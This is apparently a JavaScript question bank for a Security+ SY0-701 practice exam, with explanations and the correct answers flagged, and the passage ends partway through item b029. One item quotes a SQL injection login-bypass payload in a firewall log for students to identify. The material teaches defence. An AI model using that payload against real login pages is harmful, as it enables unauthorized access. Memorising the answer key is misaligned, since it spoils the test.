/* Exam B — Sec+ SY0-701 — 85 original questions */
export const EXAM_BANK_B = [
{id:"b001",obj:"3.1",d:3,cat:"arch",t:"mc",
 q:"A cloud-native startup runs its API on virtual machines rented from a public cloud provider under an IaaS model. A scan shows the VMs' Linux kernels are three months behind on security updates. Which of the following is responsible for applying these updates?",
 o:[
  {t:"The startup, because guest operating systems are the customer's responsibility under IaaS",ok:true,x:"In the shared responsibility matrix, IaaS providers secure the physical hosts, hypervisor, and network fabric; everything inside the VM, including the guest OS and its patches, belongs to the customer."},
  {t:"The cloud provider, because it owns the hypervisor the VMs run on",ok:false,x:"The provider does patch the hypervisor, but a guest kernel inside a tenant VM is not part of the hypervisor and the provider has no access to it under IaaS."},
  {t:"The cloud provider, because kernel updates are part of the managed runtime",ok:false,x:"A managed runtime is a PaaS feature. The startup chose IaaS, where no runtime or OS management is included."},
  {t:"Neither party, because IaaS VMs are immutable and are replaced rather than patched",ok:false,x:"Immutable infrastructure is a design choice the customer may adopt, but it still means the customer must rebuild from a patched image; the responsibility does not disappear."}
 ],
 w:"Responsibility matrix: IaaS = customer owns the OS and up; PaaS = provider owns the OS and runtime; SaaS = provider owns everything except data, identities, and configuration."},

{id:"b002",obj:"2.3",d:2,cat:"vulns",t:"mc",
 q:"A manufacturing execution system verifies that a recipe file is digitally signed, then several seconds later reads the file into the PLC programming tool. An attacker on the engineering workstation swaps the file between the check and the read, and the unsigned version is loaded. Which of the following vulnerabilities was exploited?",
 o:[
  {t:"Time-of-check to time-of-use race condition",ok:true,x:"The system validated the file at one moment and used it at a later moment; the gap between check and use let the attacker substitute content. That is the definition of a TOC/TOU race condition."},
  {t:"Buffer overflow in the PLC programming tool",ok:false,x:"Nothing in the scenario involves writing past a memory boundary; the tool loaded a well-formed but unsigned file that had been swapped in."},
  {t:"Malicious update from the PLC vendor",ok:false,x:"The file came from an attacker on the workstation, not from a compromised vendor update channel."},
  {t:"Improper input validation on recipe parameters",ok:false,x:"The recipe's contents were never the issue; the signature check itself was correct but was performed too early to be meaningful."}
 ],
 w:"TOC/TOU: a check that is separated in time from the action it protects can be raced. Fix by checking and using atomically (e.g., verify the file handle you actually read from)."},

{id:"b003",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"A financial services firm plans to use one managed security provider for several years of assorted projects. Legal wants a single umbrella contract covering payment terms, liability, and confidentiality so that each future project only needs a short document describing its deliverables. Which of the following should be signed FIRST?",
 o:[
  {t:"Master service agreement",ok:true,x:"An MSA establishes the general terms that govern the whole relationship; individual projects are then defined by statements of work that inherit those terms."},
  {t:"Statement of work",ok:false,x:"A SOW describes one specific engagement's tasks, deliverables, and timeline; it is the short per-project document the firm wants to create later, not the umbrella."},
  {t:"Service-level agreement",ok:false,x:"An SLA defines measurable performance targets such as response times; it does not set liability, payment, or confidentiality terms for an entire relationship."},
  {t:"Memorandum of understanding",ok:false,x:"An MOU documents intent to cooperate and is usually not legally binding, which is the opposite of what legal wants for liability and payment terms."}
 ],
 w:"MSA = the long-term umbrella; SOW = the per-project detail; SLA = the performance metrics; MOU = non-binding intent."},

{id:"b004",obj:"1.4",d:1,cat:"crypto",t:"mc",dg:"symasym",
 q:"A startup must encrypt 40 TB of customer records each night before shipping them to an archive bucket, and must also let a partner decrypt the archive without ever sharing a long-term secret in advance. Which of the following designs BEST meets both requirements?",
 o:[
  {t:"Encrypt the data with AES and encrypt the AES key with the partner's RSA public key",ok:true,x:"Symmetric AES handles the 40 TB efficiently; asymmetric RSA wraps only the small session key so the partner can unwrap it with their private key. This hybrid approach is how TLS and PGP work."},
  {t:"Encrypt the entire archive with the partner's RSA public key",ok:false,x:"Asymmetric encryption is thousands of times slower than symmetric and is impractical for bulk data; it is used for key exchange and signatures, not 40 TB payloads."},
  {t:"Encrypt the archive with AES and email the AES key to the partner",ok:false,x:"This shares the secret over an unprotected channel, which is exactly the key distribution problem asymmetric cryptography exists to solve."},
  {t:"Hash the archive with SHA-256 and send the partner the digest",ok:false,x:"Hashing is one-way and provides integrity, not confidentiality; the partner could verify the archive but never recover the records from a digest."}
 ],
 w:"Symmetric for speed on bulk data, asymmetric for exchanging the symmetric key. Hashing never decrypts anything."},

{id:"b005",obj:"4.6",d:4,cat:"iam",t:"mc",
 q:"A startup's deployment pipeline currently uses a shared cloud admin access key stored in the CI system. The security lead wants each pipeline run to receive its own short-lived credential that expires when the job ends, with no static secret to steal. Which of the following BEST describes this approach?",
 o:[
  {t:"Ephemeral credentials issued through a privileged access management workflow",ok:true,x:"Ephemeral (temporary) credentials are minted per session and expire automatically, eliminating the standing shared key that attackers target. This is a core PAM capability."},
  {t:"Password vaulting of the existing admin key",ok:false,x:"A vault protects the static key at rest and logs checkouts, but the same long-lived key would still be handed to every job and remain valuable if leaked."},
  {t:"Rotating the shared key every 90 days",ok:false,x:"Rotation shortens exposure but leaves a shared, reusable secret in place for weeks at a time; the requirement was no static secret at all."},
  {t:"Federating the CI system with the identity provider using SAML",ok:false,x:"Federation addresses how humans sign on to applications; it does not by itself issue per-job cloud credentials to a pipeline."}
 ],
 w:"Just-in-time and ephemeral credentials remove standing privilege: the credential exists only while the task runs."},

{id:"b006",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A bank's web application firewall logs the request below against the online banking login page. Which of the following attacks is being attempted?",
 ex:"POST /login HTTP/1.1\nHost: 203.0.113.10\nuser=jsmith' OR '1'='1'--&pass=x\n\nResponse: 302 Found  Location: /accounts",
 o:[
  {t:"SQL injection",ok:true,x:"The quote, OR '1'='1', and comment marker are classic SQL syntax meant to make the login query's WHERE clause always true; the 302 redirect to /accounts suggests it worked."},
  {t:"Cross-site scripting",ok:false,x:"XSS payloads contain script or HTML tags intended for other users' browsers; this payload contains SQL syntax aimed at the database query."},
  {t:"Credential replay",ok:false,x:"Replay reuses a previously captured valid credential or token; here the attacker did not know any real password and instead manipulated the query logic."},
  {t:"Directory traversal",ok:false,x:"Traversal uses ../ sequences in a path to read files outside the web root; nothing in this request touches the file system path."}
 ],
 w:"Quotes, OR 1=1, and -- in a form field = SQL injection. Defend with parameterized queries and input validation, not just a WAF."},

{id:"b007",obj:"3.3",d:3,cat:"data",t:"mc",
 q:"A payments startup must let its analytics team query transaction history by card, but auditors require that the real card numbers never exist in the analytics database at all. Analysts only need to recognize when two records belong to the same card. Which of the following BEST meets the requirement?",
 o:[
  {t:"Tokenization, storing the mapping in a separate vault",ok:true,x:"A token is a surrogate value with no mathematical relationship to the card number; the same card always maps to the same token, so analysts can group records while the real PAN lives only in the vault."},
  {t:"Full-database encryption with a key held by the DBA",ok:false,x:"Encrypted data is still the real card number once decrypted, and the DBA's key would expose it; auditors said the PAN must not be in the analytics store in any form."},
  {t:"Masking the last four digits in query results",ok:false,x:"Masking hides part of the value at display time, but the complete PAN would still be stored in the analytics database, which the auditors forbid."},
  {t:"Salting and hashing each card number",ok:false,x:"A unique salt per record would break the ability to match records for the same card, and unsalted hashes of 16-digit PANs can be brute-forced quickly."}
 ],
 w:"Tokenization replaces sensitive data with a reference value and keeps the real data in a vault; it preserves matching without exposing the original."},

{id:"b008",obj:"5.4",d:5,cat:"gov",t:"mc",
 q:"A bank outsources employee payroll to a SaaS provider. The bank decides which employee fields are collected and how long they are kept; the provider stores and calculates the payroll according to the bank's written instructions. A regulator asks who is the data controller. Which of the following is correct?",
 o:[
  {t:"The bank, because it determines the purpose and means of processing",ok:true,x:"The controller is the party that decides why and how personal data is processed. The bank sets the fields, the retention period, and the purpose, so it is the controller."},
  {t:"The SaaS provider, because it physically stores the data",ok:false,x:"Storing and calculating on someone else's instructions is what a processor does; possession of the data does not make the provider the controller."},
  {t:"The employees, because the data is about them",ok:false,x:"Employees are the data subjects, the individuals the data describes; they have rights over the data but are not the controller."},
  {t:"The bank's IT department, because it administers the integration",ok:false,x:"IT acts as a custodian handling the systems; the controller role belongs to the organization that decides the purpose of processing, not the team that runs the plumbing."}
 ],
 w:"Controller decides purpose and means; processor acts on the controller's instructions; data subject is the person described; custodian runs the systems."},

{id:"b009",obj:"4.3",d:4,cat:"ops",t:"ms",pick:2,
 q:"A plant's vulnerability scanner reports the finding below on a historian server in the OT network. The server is reachable only from the control network and holds no personal data, but if it stops, production reporting halts. Which TWO of the following statements are correct?",
 ex:"CVE-2024-XXXX  Remote code execution in historian web service\nCVSS v3.1 Base: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\nExploit: public proof of concept available\nVendor patch: available, requires 2 hours downtime",
 o:[
  {t:"Environmental factors such as the isolated network can justify a lower organizational priority than the base score alone",ok:true,x:"The base score assumes worst case. CVSS environmental metrics let the plant account for the fact that the service is not internet-facing, adjusting the effective risk."},
  {t:"The patch should be scheduled in a maintenance window rather than applied immediately during a production run",ok:true,x:"The two-hour downtime affects production reporting, so change management should schedule it, with segmentation and monitoring as interim compensating controls."},
  {t:"The finding can be closed as a false positive because the server is not on the internet",ok:false,x:"A false positive means the vulnerability does not exist. It does exist; network isolation reduces likelihood but is not proof the finding is wrong."},
  {t:"The base score should be manually lowered to 5.0 in the scanner",ok:false,x:"The base score is defined by the vulnerability's characteristics and should not be edited; environmental and temporal metrics are the correct way to reflect local context."},
  {t:"Because there is no personal data, the vulnerability does not need to be reported",ok:false,x:"Vulnerability reporting is about the risk to operations and integrity as well as confidentiality; an RCE on a production historian is clearly reportable."}
 ],
 w:"Prioritize with base score plus environmental context, exploitability, and business impact. Isolation lowers risk; it does not make a real vulnerability a false positive."},

{id:"b010",obj:"1.1",d:1,cat:"controls",t:"mc",dg:"controls",
 q:"A manufacturing plant posts signs at every gate stating that the yard is under 24-hour video surveillance, but only the main gate actually has a camera. The security manager asks how the signs at the other gates should be classified. Which of the following is the BEST answer?",
 o:[
  {t:"A physical deterrent control",ok:true,x:"The sign's only effect is to discourage an intruder who believes they are being watched; it cannot detect, prevent, or correct anything. That makes it deterrent, and it is a physical object at the perimeter."},
  {t:"A physical detective control",ok:false,x:"Detective controls record or reveal that an event happened. The main-gate camera is detective; a sign with no camera behind it detects nothing."},
  {t:"A technical preventive control",ok:false,x:"A sign is not a technology and cannot physically stop entry; preventive controls at the gate would be locks, fencing, or a vestibule."},
  {t:"A managerial directive control",ok:false,x:"Directive controls tell authorized people what to do, such as a policy or procedure; a warning aimed at would-be intruders is a deterrent, not guidance."}
 ],
 w:"Deterrent controls change an attacker's decision; detective controls reveal events. Ask what the control actually does, not what it claims."},

{id:"b011",obj:"3.4",d:3,cat:"data",t:"mc",
 q:"A brokerage takes storage snapshots of its order database every 60 minutes and has tested that rebuilding the database server from a snapshot takes about four hours. Which of the following correctly describes what these numbers mean?",
 o:[
  {t:"The achievable RPO is 60 minutes and the achievable RTO is about four hours",ok:true,x:"RPO is how much data can be lost, set by the time since the last usable copy (up to an hour). RTO is how long restoration takes, which testing shows is four hours."},
  {t:"The achievable RTO is 60 minutes and the achievable RPO is about four hours",ok:false,x:"This reverses the definitions: the snapshot interval bounds data loss (RPO), while the rebuild time bounds downtime (RTO)."},
  {t:"The MTTR is 60 minutes because that is how often the system self-heals",ok:false,x:"MTTR is the average time to repair a failed component; snapshots do not repair anything, they only preserve a point in time."},
  {t:"The RPO is zero because snapshots are application-consistent",ok:false,x:"Consistency makes a snapshot restorable, but any transaction after the last snapshot is lost, so RPO cannot be zero with hourly copies."}
 ],
 w:"RPO = maximum acceptable data loss (backup frequency); RTO = maximum acceptable downtime (restore speed). Snapshots set RPO, restore testing reveals RTO."},

{id:"b012",obj:"2.1",d:2,cat:"actors",t:"mc",
 q:"During an asset review, a startup discovers that its growth team has been uploading customer lists to an unapproved marketing analytics service using personal accounts, without informing IT or security. No malicious intent is found. Which of the following BEST describes this threat actor?",
 o:[
  {t:"Shadow IT",ok:true,x:"Employees deploying unsanctioned services for legitimate work, bypassing security review, is shadow IT. The risk is real (customer data on an unvetted platform) even though the motive is productivity."},
  {t:"Insider threat with a revenge motivation",ok:false,x:"The review found no malicious intent; the team was trying to do its job, not harm the company."},
  {t:"Unskilled attacker using off-the-shelf tools",ok:false,x:"An unskilled attacker is an external party running pre-built exploits; these are authorized employees using a business service."},
  {t:"Organized crime performing data exfiltration",ok:false,x:"Nothing indicates an external criminal group; the data left through an employee's well-intended but unapproved workflow."}
 ],
 w:"Shadow IT is an internal actor without malicious motive whose unsanctioned systems still create exposure. Detect with asset inventory, CASB, and DLP."},

{id:"b013",obj:"4.8",d:4,cat:"ir",t:"mc",
 q:"An engineer at a manufacturing plant notices that an HMI workstation on the packaging line is encrypting files and displaying a ransom note. The line is still running because the PLCs operate independently. Which of the following should the incident response team do FIRST?",
 o:[
  {t:"Disconnect the HMI from the control network while leaving it powered on",ok:true,x:"Isolating the host stops the malware from spreading to other HMIs and engineering stations, while keeping it powered preserves volatile memory for analysis. This is containment."},
  {t:"Power off every PLC on the packaging line",ok:false,x:"The PLCs are not infected and shutting them down causes the production outage the attacker may have wanted; containment should be proportionate and targeted."},
  {t:"Re-image the HMI from the golden image immediately",ok:false,x:"Rebuilding is eradication and recovery; doing it first destroys evidence and skips containment, so other hosts may already be infected."},
  {t:"Begin a lessons-learned review with plant management",ok:false,x:"Lessons learned is the final phase after recovery; during an active infection the priority is stopping the spread."}
 ],
 w:"IR order: detect, analyze, contain, eradicate, recover, learn. Contain by isolating the host from the network, not by powering off unaffected equipment."},

{id:"b014",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"Before evaluating three software vendors, a financial firm needs to share its internal network architecture and integration requirements with each of them. Which of the following should be executed with each vendor BEFORE the documents are shared?",
 o:[
  {t:"Non-disclosure agreement",ok:true,x:"An NDA legally binds each vendor to keep the architecture confidential, which is the protection needed before sensitive design details leave the firm during evaluation."},
  {t:"Service-level agreement",ok:false,x:"An SLA sets performance targets for a service the firm has already purchased; none of the vendors has been selected yet."},
  {t:"Business partners agreement",ok:false,x:"A BPA governs a joint venture's responsibilities and profit sharing; the firm is evaluating suppliers, not forming a partnership."},
  {t:"Right-to-audit clause",ok:false,x:"A right-to-audit clause lets the firm inspect a vendor's controls once a contract exists; it does not protect information disclosed during pre-sales evaluation."}
 ],
 w:"NDA first whenever confidential information is exchanged, including during vendor selection, before any service contract is in place."},

{id:"b015",obj:"3.1",d:3,cat:"arch",t:"mc",
 q:"A startup rewrites an image-resizing job as cloud functions that run only when a file is uploaded, and the provider bills per invocation. The CTO asks what security work remains for the startup itself. Which of the following is the BEST answer?",
 o:[
  {t:"Securing the function code, its dependencies, permissions, and the events that trigger it",ok:true,x:"With serverless, the provider runs and patches the execution environment, but the startup still owns its code, third-party libraries, the IAM role the function assumes, and input validation on triggers."},
  {t:"Patching the operating system that hosts the functions",ok:false,x:"Serverless removes OS management from the customer entirely; the provider owns the underlying hosts and runtime."},
  {t:"Nothing, because the provider assumes all security responsibility for serverless workloads",ok:false,x:"No cloud model transfers responsibility for the customer's own code, data, and identity configuration; a vulnerable function is the startup's problem."},
  {t:"Hardening the hypervisor to prevent VM escape between functions",ok:false,x:"The hypervisor is invisible to serverless customers and is exclusively the provider's responsibility."}
 ],
 w:"Serverless shifts OS and runtime patching to the provider; code, dependencies, least-privilege roles, and input handling stay with you."},

{id:"b016",obj:"2.2",d:2,cat:"social",t:"mc",
 q:"An accounts-payable clerk at a bank receives an email from a long-time supplier's genuine address asking that future payments go to a new account. The thread includes real prior correspondence, and the writing style matches. Two weeks later the supplier reports it was never paid. Which of the following BEST describes the attack?",
 o:[
  {t:"Business email compromise using the supplier's hijacked mailbox",ok:true,x:"The message came from the real account with real thread history, meaning the supplier's mailbox was compromised and used to redirect payments. This is the invoice-fraud form of BEC."},
  {t:"Typosquatting of the supplier's domain",ok:false,x:"Typosquatting relies on a lookalike domain; the scenario states the email came from the supplier's genuine address."},
  {t:"Pretexting by an impersonated bank executive",ok:false,x:"No executive was impersonated and no fabricated story was needed; the attacker relied on an authentic existing conversation."},
  {t:"Watering hole attack on the supplier's website",ok:false,x:"A watering hole compromises a site that victims visit to infect them; this attack abused email to change payment details, not a website."}
 ],
 w:"BEC often comes from a real compromised account, so header checks pass. Verify any banking change by calling a known number, never through the same email thread."},

{id:"b017",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"A plant's HMI workstations run a vendor-locked Windows build on which the vendor forbids installing antivirus or applying non-approved updates. Malware has repeatedly been introduced by USB drives. Which of the following hardening measures BEST reduces the risk without violating the vendor's conditions?",
 o:[
  {t:"Enforce an application allow list so only the HMI software and signed vendor tools can execute",ok:true,x:"An allow list blocks any unapproved executable, including USB-borne malware, without adding third-party scanning software or changing the vendor image. It is the standard ICS/SCADA hardening approach."},
  {t:"Install an endpoint detection and response agent from a different vendor",ok:false,x:"The vendor explicitly forbids adding security software; an EDR agent would void support just as antivirus would."},
  {t:"Apply the latest Windows cumulative update outside the vendor's schedule",ok:false,x:"Non-approved updates are prohibited and may break the HMI software; patching is not an option under these conditions."},
  {t:"Move the HMIs to the corporate network so the central antivirus can scan them",ok:false,x:"This increases the attack surface by exposing control systems to the enterprise LAN and still requires installing the forbidden agent."}
 ],
 w:"When you cannot patch or install agents on OT hosts, use allow listing, USB port controls, and segmentation as compensating controls."},

{id:"b018",obj:"1.4",d:1,cat:"crypto",t:"mc",dg:"hash",
 q:"A startup's authentication service stores passwords as a single SHA-256 hash with a per-user salt. A penetration tester cracks 30% of them in a day using GPUs. Which of the following changes would MOST increase the attacker's cost per guess?",
 o:[
  {t:"Replace the single hash with a key-stretching function such as bcrypt or PBKDF2 with a high work factor",ok:true,x:"Key stretching runs thousands of iterations (or memory-hard operations) per guess, turning billions of GPU guesses per second into thousands. Salting was already present; speed was the problem."},
  {t:"Switch from SHA-256 to SHA-512",ok:false,x:"SHA-512 is a different fast hash, still designed to run quickly; it does not materially slow a GPU cracking rig."},
  {t:"Use a single global salt stored in the application config",ok:false,x:"Moving from per-user salts to one shared salt is a downgrade that re-enables precomputed attacks across all accounts."},
  {t:"Encrypt the hashes with AES before storing them",ok:false,x:"If the attacker obtained the database they likely can obtain the application's key too; and encryption does not slow guessing once the layer is removed."}
 ],
 w:"Salt defeats precomputation; key stretching (bcrypt, scrypt, Argon2, PBKDF2) defeats speed. Password storage needs both."},

{id:"b019",obj:"4.5",d:4,cat:"ops",t:"mc",
 q:"A bank has published the DNS records below for its domain. Customers still report receiving convincing phishing emails that appear to come from the bank's exact domain. Which of the following changes would BEST reduce these spoofed messages reaching customers?",
 ex:"bank.example  TXT  \"v=spf1 include:_spf.mailhost.example -all\"\nselector1._domainkey.bank.example  TXT  \"v=DKIM1; k=rsa; p=MIIB...\"\n_dmarc.bank.example  TXT  \"v=DMARC1; p=none; rua=mailto:dmarc@bank.example\"",
 o:[
  {t:"Change the DMARC policy from p=none to p=reject after reviewing aggregate reports",ok:true,x:"SPF and DKIM are in place, but p=none tells receivers to take no action on failures. Moving to quarantine and then reject instructs receiving servers to drop spoofed mail."},
  {t:"Change the SPF record from -all to +all",ok:false,x:"+all authorizes every sender in the world, which would make spoofing easier, not harder."},
  {t:"Remove the DKIM record because the public key is exposed",ok:false,x:"DKIM public keys are meant to be published; removing DKIM removes one of the two authentication checks DMARC relies on."},
  {t:"Add a second rua address so more staff receive reports",ok:false,x:"More reporting recipients improves visibility but does nothing to stop receivers from delivering spoofed messages."}
 ],
 w:"SPF and DKIM authenticate; DMARC tells receivers what to do on failure. p=none is monitor-only; enforcement requires quarantine or reject."},

{id:"b020",obj:"5.2",d:5,cat:"gov",t:"mc",dg:"risk",
 q:"A plant's risk register contains the entry below. Which of the following is the annualized loss expectancy for this risk?",
 ex:"Risk: Fire in paint booth\nAsset value (AV): $2,000,000\nExposure factor (EF): 25%\nAnnualized rate of occurrence (ARO): 0.1\nRisk owner: Plant manager",
 o:[
  {t:"$50,000",ok:true,x:"SLE = AV × EF = 2,000,000 × 0.25 = $500,000. ALE = SLE × ARO = 500,000 × 0.1 = $50,000 expected loss per year."},
  {t:"$500,000",ok:false,x:"$500,000 is the single loss expectancy, the cost of one fire; it has not yet been multiplied by how often a fire is expected (once per ten years)."},
  {t:"$200,000",ok:false,x:"This is AV × ARO, which skips the exposure factor; the fire destroys 25% of the asset, not all of it."},
  {t:"$5,000,000",ok:false,x:"This multiplies the SLE by 10 instead of by 0.1; an ARO of 0.1 means once every ten years, so the annual figure must be smaller than the SLE."}
 ],
 w:"SLE = AV × EF; ALE = SLE × ARO. An ARO below 1 always makes ALE smaller than SLE."},

{id:"b021",obj:"3.2",d:3,cat:"netsec",t:"mc",
 q:"A manufacturing plant must send production metrics from its control network to a corporate dashboard while guaranteeing that no traffic, not even a TCP acknowledgement, can ever flow from the corporate side into the control network. Which of the following BEST meets this requirement?",
 o:[
  {t:"A unidirectional gateway (data diode) between the control network and a replication server",ok:true,x:"A data diode physically permits data in one direction only, so an attacker on the corporate side has no path in. It is the standard approach for one-way OT-to-IT reporting."},
  {t:"A stateful firewall permitting only outbound connections from the control network",ok:false,x:"Stateful firewalls still pass return packets for established sessions, so acknowledgements and responses flow back into the control network, which the requirement forbids."},
  {t:"A jump server in a screened subnet between the two networks",ok:false,x:"A jump server is a controlled bidirectional path for administrators; it exists precisely to let traffic reach the protected zone."},
  {t:"A VPN tunnel with IPSec between the historian and the dashboard",ok:false,x:"IPSec protects confidentiality and integrity but is fully bidirectional; encryption does not prevent inbound traffic."}
 ],
 w:"Physical isolation or a unidirectional gateway is the only way to enforce truly one-way flow; firewalls and VPNs are bidirectional by nature."},

{id:"b022",obj:"2.3",d:2,cat:"vulns",t:"mc",
 q:"A startup provisions a new virtual disk in its cloud tenant and, before formatting it, a developer reads raw sectors and finds fragments of another organization's database backup. Which of the following vulnerabilities does this represent?",
 o:[
  {t:"Resource reuse in a virtualized environment",ok:true,x:"When a hypervisor or storage layer reassigns memory or disk blocks to a new tenant without sanitizing them, the previous tenant's data leaks. This is the resource reuse vulnerability listed under virtualization."},
  {t:"VM escape from the developer's instance",ok:false,x:"VM escape means code inside a guest breaks out to the hypervisor or other guests; here the developer stayed within their own VM and simply read unsanitized storage."},
  {t:"Cloud storage bucket misconfiguration",ok:false,x:"No bucket permissions were involved; the data appeared on a freshly allocated block device, not through a public object listing."},
  {t:"Side-channel attack via shared CPU cache",ok:false,x:"Side channels infer secrets through timing or cache behavior; this was direct recovery of leftover data from reused blocks."}
 ],
 w:"Virtualization vulns: VM escape (break out of the guest) versus resource reuse (leftover data from a previous tenant). Providers must zero storage before reallocation."},

{id:"b023",obj:"4.6",d:4,cat:"iam",t:"mc",dg:"saml",
 q:"A B2B startup wants each corporate customer's staff to sign in to the startup's web portal using the customer's own identity provider, so the startup never stores those users' passwords and can receive group membership from the customer. Which of the following should the startup implement?",
 o:[
  {t:"Federation with the customer IdPs using SAML assertions",ok:true,x:"SAML federation lets the customer's IdP authenticate the user and send a signed assertion containing identity and group attributes to the portal, which acts as the service provider."},
  {t:"LDAP binds from the portal to each customer's directory",ok:false,x:"Direct LDAP binds would require the portal to handle the customer's passwords and reach into each customer's internal directory, which most customers will not permit."},
  {t:"A local account per user with mandatory MFA",ok:false,x:"Local accounts mean the startup stores credentials and manages lifecycle for other companies' staff, the opposite of the requirement."},
  {t:"Kerberos tickets from the startup's own domain controller",ok:false,x:"Kerberos works within a single realm or trusted domains; it is not designed for cross-organization web SSO with arbitrary customers."}
 ],
 w:"Federation = trust another organization's IdP. SAML (and OIDC) carry signed assertions with attributes; the SP never sees the password."},

{id:"b024",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"A bank asks a cloud provider for a right-to-audit clause and the provider refuses, citing thousands of tenants. The bank still needs credible evidence that the provider's controls are designed and operating effectively. Which of the following should the bank request INSTEAD?",
 o:[
  {t:"An independent third-party audit report covering the provider's control environment",ok:true,x:"When on-site audits are impractical, an independent assessment (such as a SOC 2 Type II or ISO 27001 certification with report) provides externally validated evidence that the bank can rely on."},
  {t:"A completed self-assessment questionnaire from the provider",ok:false,x:"A questionnaire is the provider's own claims with no independent verification; it is useful for screening but weak as evidence of operating effectiveness."},
  {t:"A penetration test performed by the bank against the provider's shared infrastructure",ok:false,x:"Testing multi-tenant infrastructure without authorization is prohibited and would affect other customers; providers do not allow it."},
  {t:"A memorandum of understanding stating the provider follows best practices",ok:false,x:"An MOU is a non-binding statement of intent and provides no evidence that any control actually works."}
 ],
 w:"Vendor assessment evidence, strongest to weakest: right-to-audit, independent third-party audit, evidence of internal audits, then questionnaires."},

{id:"b025",obj:"1.2",d:1,cat:"controls",t:"mc",dg:"zerotrust",
 q:"A financial firm is deploying a zero trust architecture. An engineer must identify which component sits in the data path in front of the trading application and actually opens or closes each connection based on the decision it receives. Which of the following is that component?",
 o:[
  {t:"Policy enforcement point",ok:true,x:"The PEP lives on the data plane, in line with the traffic; it receives the allow or deny verdict from the control plane and enforces it on the session."},
  {t:"Policy engine",ok:false,x:"The policy engine is on the control plane and computes the decision using identity, device posture, and risk; it does not touch the traffic itself."},
  {t:"Policy administrator",ok:false,x:"The policy administrator relays the engine's decision and configures the enforcement point; it is a control plane component, not the gate in the data path."},
  {t:"Adaptive identity service",ok:false,x:"Adaptive identity supplies context such as behavior and location to the policy engine; it is an input to the decision rather than the point of enforcement."}
 ],
 w:"Control plane decides (policy engine + policy administrator); data plane enforces (policy enforcement point). Subject and system sit behind the PEP."},

{id:"b026",obj:"4.5",d:4,cat:"ops",t:"ms",pick:2,
 q:"A startup scans the public IP of its bastion host and receives the output below. Which TWO of the following actions should be taken FIRST?",
 ex:"Nmap scan report for 198.51.100.25\nPORT      STATE  SERVICE   VERSION\n22/tcp    open   ssh       OpenSSH 9.6\n80/tcp    open   http      nginx 1.26\n6379/tcp  open   redis     Redis 7.2 (no auth)\n9200/tcp  open   http      Elasticsearch 8.x",
 o:[
  {t:"Remove public exposure of Redis and Elasticsearch by binding them to internal addresses and firewalling the ports",ok:true,x:"An unauthenticated Redis and a search cluster on the internet are direct data-theft and RCE paths; nothing about a bastion requires them to be reachable externally."},
  {t:"Restrict SSH on port 22 to the company's VPN or known source addresses",ok:true,x:"A bastion needs SSH, but it should be limited to trusted sources to cut brute-force and credential-stuffing exposure while keeping administrators working."},
  {t:"Upgrade OpenSSH to a newer version immediately",ok:false,x:"OpenSSH 9.6 is a current release with no indicated vulnerability; the open data services are the urgent finding."},
  {t:"Disable port 80 and serve the page over HTTPS only",ok:false,x:"Serving over TLS is good practice, but a static nginx page is far lower risk than unauthenticated data stores and can be scheduled later."},
  {t:"Block ICMP so the host no longer responds to scanners",ok:false,x:"Hiding from ping does not close any open port and provides no real protection against a scan that already found the services."}
 ],
 w:"Open service ports are attack surface. Close what should never be public, then restrict what must be public to trusted sources."},

{id:"b027",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"Operators on a plant's control network report that HMI screens are updating slowly. An engineer runs the command below on an HMI. The gateway 10.20.0.1 is a hardware router whose true MAC begins with 00:1a. Which of the following attacks is MOST likely occurring?",
 ex:"$ arp -a\n10.20.0.1    at 08:00:27:5c:3e:11  [ether] on eth0\n10.20.0.44   at 08:00:27:5c:3e:11  [ether] on eth0\n10.20.0.12   at 00:50:56:9a:02:77  [ether] on eth0",
 o:[
  {t:"On-path attack using ARP poisoning",ok:true,x:"The gateway's IP now maps to the same MAC as host 10.20.0.44, meaning that host has claimed to be the router. Traffic is being relayed through it, which explains the latency."},
  {t:"DNS cache poisoning of the HMI",ok:false,x:"DNS poisoning would alter name-to-IP answers; the ARP table shows a MAC-layer substitution, and control networks rarely depend on DNS."},
  {t:"MAC flooding of the control network switch",ok:false,x:"MAC flooding fills the switch CAM table to force broadcast behavior; it would not rewrite the gateway's entry in a host's ARP cache to another host's MAC."},
  {t:"Amplified DDoS against the router",ok:false,x:"An amplification attack would show as saturated links or an unreachable router, not as a duplicate MAC address in the ARP table."}
 ],
 w:"Two IPs sharing one MAC, especially the gateway, is the fingerprint of ARP spoofing. Mitigate with dynamic ARP inspection and static entries on critical OT hosts."},

{id:"b028",obj:"3.3",d:3,cat:"data",t:"mc",
 q:"A startup's database replicates automatically to a second cloud region for resilience. A new customer contract requires that its records never leave the country where the primary region is located, and the second region is abroad. Which of the following BEST satisfies the contract while keeping resilience?",
 o:[
  {t:"Apply geographic restrictions so that customer's data replicates only to a second region inside the same country",ok:true,x:"Geographic restriction of replication targets keeps the data within the required jurisdiction while still providing a second copy. Data sovereignty requirements are about where data resides, not whether it is copied."},
  {t:"Encrypt the replicated copy so it cannot be read abroad",ok:false,x:"Encrypted data is still data stored abroad; sovereignty rules address location and legal jurisdiction, and ciphertext does not satisfy them."},
  {t:"Disable replication entirely for the whole database",ok:false,x:"This meets the contract for one customer by removing resilience for everyone; a targeted geographic control is more appropriate."},
  {t:"Tokenize the customer's records before replication",ok:false,x:"Tokens would still need a vault, and the contract governs the records themselves; tokenization does not change where the original data is stored or replicated."}
 ],
 w:"Data sovereignty: data is subject to the laws of where it is stored. Use geolocation-aware replication and geographic restrictions rather than assuming encryption is enough."},

{id:"b029",obj:"5.2",d:5,cat:"gov",t:"mc",
 q:"A bank's risk register lists 'unpatched ATM software' with a likelihood, an impact score, and a threshold of 'more than 5 ATMs unpatched beyond 30 days'. The committee notices nobody is named as accountable for keeping the risk within that threshold. Which of the following register elements is missing?",
 o:[
  {t:"Risk owner",ok:true,x:"Each register entry needs a named individual accountable for monitoring the risk and acting when it exceeds the threshold; without an owner, the entry cannot be managed."},
  {t:"Key risk indicator",ok:false,x:"The count of ATMs unpatched beyond 30 days is a KRI, and it is already present as the basis for the threshold."},
  {t:"Risk appetite statement",ok:false,x:"Risk appetite is the organization-wide stance set by the board, not a field on an individual register row."},
  {t:"Exposure factor",ok:false,x:"EF is used in quantitative analysis to compute SLE; the register already captures qualitative likelihood and impact, and EF would not fix the accountability gap."}
 ],
